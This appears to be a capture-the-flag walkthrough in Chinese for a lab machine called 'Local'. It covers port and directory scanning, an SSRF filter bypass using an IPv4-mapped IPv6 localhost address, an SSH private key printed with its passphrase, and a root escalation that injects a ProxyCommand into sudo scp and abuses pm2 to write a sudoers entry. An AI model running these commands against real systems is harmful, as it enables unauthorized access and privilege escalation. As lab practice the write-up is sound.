---
title: Local
date: 2026-05-14T15:18:53+08:00
lastmod: 2026-05-14T17:07:33+08:00
---
# 信息收集

```
nmap -p-  192.168.100.49
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-14 03:19 EDT
Nmap scan report for 192.168.100.49
Host is up (0.00080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3006/tcp open  deslogind
MAC Address: 08:00:27:16:17:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
```

```
sudo dirsearch -u http://192.168.100.49 
[sudo] password for kali: 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/http_192.168.100.49/_26-05-14_03-19-57.txt

Target: http://192.168.100.49/

[03:19:57] Starting: 
[03:19:58] 403 -  317B  - /.ht_wsr.txt                                    
[03:19:58] 403 -  317B  - /.htaccess.orig                                 
[03:19:58] 403 -  317B  - /.htaccess.bak1
[03:19:58] 403 -  317B  - /.htaccess.sample                               
[03:19:58] 403 -  317B  - /.htaccess.save
[03:19:58] 403 -  317B  - /.htaccess_extra
[03:19:58] 403 -  317B  - /.htaccess_orig                                 
[03:19:58] 403 -  317B  - /.htaccess_sc
[03:19:58] 403 -  317B  - /.htaccessBAK
[03:19:58] 403 -  317B  - /.htaccessOLD2
[03:19:58] 403 -  317B  - /.htaccessOLD                                   
[03:19:58] 403 -  317B  - /.htm
[03:19:58] 403 -  317B  - /.html                                          
[03:19:58] 403 -  317B  - /.httr-oauth                                    
[03:19:58] 403 -  317B  - /.htpasswds
[03:19:58] 403 -  317B  - /.htpasswd_test
[03:20:03] 200 -  820B  - /cgi-bin/printenv                               
[03:20:03] 200 -    1KB - /cgi-bin/test-cgi
[03:20:08] 200 -  155B  - /package.json                                   
[03:20:10] 403 -  317B  - /server-status/                                 
[03:20:10] 403 -  317B  - /server-status                                  
                                                                    
```

# package.json

```
{
  "name": "ssrf-challenge",
  "version": "1.0.0",
  "main": "app.js",
  "dependencies": {
    "express": "^4.18.2",
    "is-localhost-ip": "2.0.0"
  }
}
```

# cgi-bin/test-cgi

```
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/sh shebang, and set this script executable
# with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

# disable filename globbing
set -f

echo "Content-type: text/plain; charset=iso-8859-1"
echo

echo CGI/1.0 test script report:
echo

echo argc is $#. argv is "$*".
echo

echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = "$HTTP_ACCEPT"
echo PATH_INFO = "$PATH_INFO"
echo PATH_TRANSLATED = "$PATH_TRANSLATED"
echo SCRIPT_NAME = "$SCRIPT_NAME"
echo QUERY_STRING = "$QUERY_STRING"
echo REMOTE_HOST = $REMOTE_HOST
echo REMOTE_ADDR = $REMOTE_ADDR
echo REMOTE_USER = $REMOTE_USER
echo AUTH_TYPE = $AUTH_TYPE
echo CONTENT_TYPE = $CONTENT_TYPE
echo CONTENT_LENGTH = $CONTENT_LENGTH
```

# cgi-bin/printenv

```
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/perl shebang, and on Unix / Linux also
# set this script executable with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

##
##  printenv -- demo CGI program which just prints its environment
##
use strict;
use warnings;

print "Content-type: text/plain; charset=iso-8859-1\n\n";
foreach my $var (sort(keys(%ENV))) {
    my $val = $ENV{$var};
    $val =~ s|\n|\\n|g;
    $val =~ s|"|\\"|g;
    print "${var}=\"${val}\"\n";
}
```

很明显打ssrf

# 3006端口

```
Web Previewer
Usage: /preview?url=http://example.com
```

# SSRF

```
http://192.168.100.49:3006/preview?url=http://[::ffff:127.0.0.1]/package.json

{
  "name": "ssrf-challenge",
  “版本”: “1.0.0，
  "main": "app.js",
  "依赖项": {
    "express": "^4.18.2",
    "is-localhost-ip": "2.0.0"
  }
}
```

```
http://192.168.100.49:3006/preview?url=http://[::ffff:127.0.0.1]:3006/flag

{"status":"success","flag":"0h6WTnHJggZg451m"}
```

# 得到私钥

```
http://192.168.100.49/0h6WTnHJggZg451m/
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDwS8zko+
1L+A6lIVUI8OycAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAICNoJ+OrztBU///d
h239MLIyPjhUdvUj5TvsrO6Ub/6jAAAAkDGs74H2Mc8HPeVRe41W9QlmQwVj+HH170QF5P
wFMkoTJdlLyKWkKoUFVIpiOd5fVhy+xoSwwkOGHcrxCaIyk70uJ+VMELfMOt4JzH0jja/L
TDfWAPa8Ss8JzTHp3VsOyNzt1Zy8Y4ooUjk32Pdpy9CQAtlbyA/9Z4SCKgc6vFvWHgj5YT
WJ9X0V1ZZXa8ZD6Q==
-----END OPENSSH PRIVATE KEY-----
```

这个文件名就是 passphrase

0h6WTnHJggZg451m

```
ssh-keygen -y -f 123

Enter passphrase for "123": 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNoJ+OrztBU///dh239MLIyPjhUdvUj5TvsrO6Ub/6j wiktor@Lara
```

得到用户名

![image](assets/image-20260514162510-kqjwyx3.png)

# 提权到 citrus

查看 sudo 权限：

```
sudo -l 
```

结果：

```
User wiktor may run the following commands on Local:     (citrus) NOPASSWD: /usr/bin/scp 
```

说明 wiktor 可以免密以 citrus 身份运行 scp。

scp 的 -S 参数可以指定用于连接远程主机的程序。构造 wrapper：

```
先借 scp 切到 citrus 这条权限链

touch /tmp/x
sudo -u citrus /usr/bin/scp -o ProxyCommand="sh -c 'id > /tmp/c.out; whoami >> /tmp/c.out; sudo -l >> /tmp/c.out 2>&1; exit 1'" /tmp/x y:/tmp/z >/dev/null 2>/tmp/c.err || true
cat /tmp/c.out

uid=1001(citrus) gid=1001(citrus) groups=1001(citrus)
citrus
User citrus may run the following commands on Local:
    (ALL : ALL) NOPASSWD: /usr/local/bin/pm2
```

再让 citrus 通过 pm2 给 wiktor 下发 root sudo

```
touch /tmp/x
sudo -u citrus /usr/bin/scp -o ProxyCommand="sh -c 'sudo /usr/local/bin/pm2 start /bin/sh --name givesudo -- -c \"echo wiktor\\ ALL=\\(ALL:ALL\\)\\ NOPASSWD:\\ ALL > /etc/sudoers.d/zz_wiktor && chmod 440 /etc/sudoers.d/zz_wiktor\" >/tmp/gs.out 2>/tmp/gs.err; exit 1'" /tmp/x y:/tmp/z >/dev/null 2>/dev/null || true
sleep 2
sudo -l
```

```
sudo -u citrus /usr/bin/scp -o ProxyCommand="sh -c 'sudo /usr/local/bin/pm2 start /bin/sh --name givesudo -- -c \"echo wiktor\\ ALL=\\(ALL:ALL\\)\\ NOPASSWD:\\ ALL > /etc/sudoers.d/zz_wiktor && chmod 440 /etc/sudoers.d/zz_wiktor\" >/tmp/gs.out 2>/tmp/gs.err; exit 1'" /tmp/x y:/tmp/z >/dev/null 2>/dev/null || true
sleep 2
sudo -l
Matching Defaults entries for wiktor on Local:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for wiktor:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User wiktor may run the following commands on Local:
    (citrus) NOPASSWD: /usr/bin/scp
    (ALL : ALL) NOPASSWD: ALL
```

![image](assets/image-20260514170724-suf6bnp.png)

```
flag{root-1b499d262771d39ceb16056de9834025}
```
